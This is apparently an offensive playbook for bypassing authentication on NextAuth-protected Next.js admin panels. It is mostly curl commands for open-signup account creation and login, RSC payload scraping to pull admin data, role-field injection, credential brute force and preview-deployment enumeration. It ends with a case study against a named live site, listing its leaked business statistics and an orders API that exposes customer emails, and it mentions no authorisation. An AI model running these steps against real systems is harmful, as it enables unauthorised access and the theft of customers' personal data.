# NextAuth Admin Takeover — Methodology

## When to Use
- Target is a Next.js app with NextAuth-protected admin panel
- The admin panel routes confirmed via Next.js RSC payload analysis
- Goal: bypass authentication without valid credentials

## Attack Surface Mapping (Phase 0)

### A. Identify NextAuth Providers
```bash
curl "https://target.com/api/auth/providers"
```
Returns: provider id, type (oidc/oauth/credentials), signin URL, callback URL.

### B. RSC Auth Gate Detection (Next.js App Router — CRITICAL TECHNIQUE)
```bash
# The "5:" index in __next_f RSC payloads reveals the auth decision:
curl -s -b cookies.txt "https://target.com/admin" | grep -oP '5:E\{[^}]*\}|5:I\[[0-9]+' | head -5

# Decode:
# 5:E{"digest":"NEXT_REDIRECT;replace;/auth/signin;307;"}  → unauthenticated, redirect
# 5:I[96619 → admin layout component rendered (BYPASS!)
# 5:E{"digest":"No access"} → authenticated but role-gated
```
**KEY INSIGHT**: When `5:I[96619` or similar component ID appears instead of `5:E{...}`, the admin dashboard has been server-rendered. The data is in the HTML even if the API endpoints return 403. This means **SSR data leakage** — admin stats, charts, and order data embedded in RSC payload.

### C. Check admin API endpoints
```bash
curl -s -w '%{http_code}' "https://target.com/api/admin/users"
# 403 → role-protected but endpoint EXISTS
# 200 → unguarded — MAJOR finding

curl -s -w '%{http_code}' "https://target.com/api/admin/orders"
# 200 with real data in HTML → data leaked even for non-admin users
```

## Attack Vectors

### VECTOR A: Open Registration + Auto-Login (HIGHEST PROBABILITY — DO FIRST)

Many NextAuth apps expose a `/api/auth/signup` endpoint.

**IMPORTANT**: Signup returns 201 but does NOT set session cookies — only creates DB record. Session is set by credential callback. Always follow signup with credential login.

```bash
# Step 1: Register
curl -X POST "https://target.com/api/auth/signup" \
  -H "Content-Type: application/json" \
  -d '{"email":"hunter_<rand>@test.com","password":"Pass123!","name":"Hunter"}'

# Step 2: CSRF + credential login (sets session)
CSRF=$(curl -s -c /tmp/session.txt "https://target.com/api/auth/csrf" | jq -r .csrfToken)
curl -s -c /tmp/session.txt -b /tmp/session.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "csrfToken=$CSRF" \
  --data-urlencode "email=hunter_<rand>@test.com" \
  --data-urlencode "password=Pass123!" \
  "https://target.com/api/auth/callback/credentials"
# → 302 → https://target.com/ (not ?error= → SUCCESS)

# Step 3: Verify + Admin
curl -s -b /tmp/session.txt "https://target.com/api/auth/session"
curl -s -b /tmp/session.txt "https://target.com/admin" | grep -oP '5:[IE].*?(?=")' | head -1
```

### VECTOR B: RSC Data Leakage (NON-ADMIN BUT DATA EXPOSED)
Even when `/api/admin/users` returns 403 (role-gated API), the admin DASHBOARD page may render full stats in RSC. Check:
```bash
# With valid session, access admin page
curl -s -b /tmp/session.txt "https://target.com/admin" | grep -oP '(Total Users|Paid Orders|Total Revenue|Videos Generated)[C^0-9]*[0-9,.]+'

# Also check order data
curl -s -b /tmp/session.txt "https://target.com/api/admin/orders" | grep -oP '"email":"[C^"]*"'
```

### VECTOR C: Role Escalation via Signup Field Injection
```bash
for field in '"is_admin":true' '"role":"admin"' '"isAdmin":true' '"permission":"admin"'; do
  curl -X POST "https://target.com/api/auth/signup" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"esc_<rand>@t.com\",\"password\":\"P@ss1\",\"name\":\"Esc\",$field}"
done
# Typically all 201 — fields ignored. Role assigned server-side in DB.
```

### VECTOR D: OAuth Callback Evaluation
```bash
curl "https://target.com/api/auth/callback/google?code=fake&state=fake"
# 302 → /api/auth/error?error=Configuration → OAuth not configured
# NOT exploitable without client secrets
```

### VECTOR E: Credential Brute Force
```bash
CSRF=$(curl -s -c /tmp/brute.txt "https://target.com/api/auth/csrf" | jq -r .csrfToken)
curl -X POST "https://target.com/api/auth/callback/credentials" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/brute.txt \
  --data-urlencode "email=candidate@target.com" \
  --data-urlencode "password=candidate_pass" \
  --data-urlencode "csrfToken=$CSRF" \
  --data-urlencode "callbackUrl=https://target.com/admin" \
  --data-urlencode "redirect=false" --data-urlencode "json=true"
```

### VECTOR F: Vercel Preview Deployment Enumeration
```bash
for pattern in "target" "target-ai" "target-app" "target-git-main"; do
  curl -4 -s "https://${pattern}.vercel.app" -w '%{http_code}\n'
done
# 200 → old preview, possibly without auth
# 402 → payment required (blocked)
```

## Response Code Cheat Sheet

| HTTP | Location / Body | Meaning |
|------|----------------|---------|
| 302 → `/auth/signin?error=CredentialsSignin` | Invalid credentials OR user not registered |
| 302 → `/` + `Set-Cookie: __Secure-authjs.session-token` | **LOGIN SUCCESS** |
| 302 → `/auth/signin?error=MissingCSRF` | CSRF token mismatch or missing |
| 200 + `null` | `/api/auth/session` → unauthenticated |
| 200 + `{"user":{...}}` | `/api/auth/session` → authenticated |
| 200 + `{"code":403,"message":"Unauthorized"}' | `/api/admin/users` → role-gated API |
| 200 + HTML (40-80KB) with real data | Admin page rendered — **data exposed** |
| 201 + `"User registered successfully"` | Open signage — **CRITICAL** |
| 404 | Endpoint doesn't exist |
| 302 → `/api/auth/error?error=Configuration` | OAuth provider not configured |
| RSC `5:E{...NEXT_REDIRECT...}` | Unauthenticated → redirect (but data still in HTML) |
| RSC `5:I[96619` | Admin component rendered → **bypassed** |

## Connection / IPv6 Pitfalls

**Always use `curl -4` when probing Cloudflare-backed hosts.** IPv6 can silently fail:
```bash
curl -4 -s "https://target.com/"
```

## Pivot Options After Auth Exhaustion
- Open registration (highest-impact, try first)
- RSC data leakage (admin dashboard data in SSR HTML)
- Exploit leaked API keys in GitHub repos
- NextAuth JWT tampering if secret leaked
- Infrastructure recon (Supabase, direct DB, cloud dashboards)
- Partners/third-party integrations with weaker auth

## Everlyn Case Study (2026-07-29)

### Setup
- Target: `everlyn.ai` (Next.js 14 App Router + NextAuth v4)
- Hosted behind Cloudflare
- Providers: credentials + Google (oidc) + GitHub (oauth)
- Admin route: `/[locale]/(admin)/admin/`

### Findings
| Finding | Detail |
|---------|--------|
| Open registration | `POST /api/auth/signup` → 201 (any email, no verification) |
| Auto-login | Credential callback sets session for any registered user |
| Admin dashboard RSC | `5:I[96619` renders full dashboard (NOT redirect/error) |
| Stats exposed | Total Users: 171,743 / Paid Orders: 47,967 / Revenue: $595,910.98 / Videos: 8,482,246 |
| Chart data | 90-day daily user/order/video counts in RSC payload |
| Orders API | `/api/admin/orders` returns real customer emails + order details |
| Users API | `/api/admin/users` → 403 (properly role-gated on API layer) |
| Google OAuth | 302 → Configuration error (not configured) |
| GitHub OAuth | 302 → Configuration error (not configured) |
| Vercel preview | `everlyn.vercel.app` → 200 (old template), `everlyn-ai.vercel.app` → 402 |

### Key Technique: RSC Auth Gate Check
```bash
# The 5: index in Next.js RSC payload encodes the auth result:
curl -s -b session_cookies.txt "https://everlyn.ai/admin" \
  | grep -oP '5:[IE].*?(?=")' | head -1
# Authenticated admin: 5:I[96619
# Unauthenticated: 5:E{"digest":"NEXT_REDIRECT;replace;/auth/signin;302;"}
```
The server renders the full admin page with data, then the RSC stream tells the client whether to redirect or display it. Even the sign-out page contains partial admin stats (because the RSC payload carries the SSR output before the redirect fires).

### Timeline
- 2-3 hours for full NextAuth vector suite + brute force + open registration + RSC data leakage
- Quickest path to admin data: open signup → token login → access admin page → extract stats from RSC HTML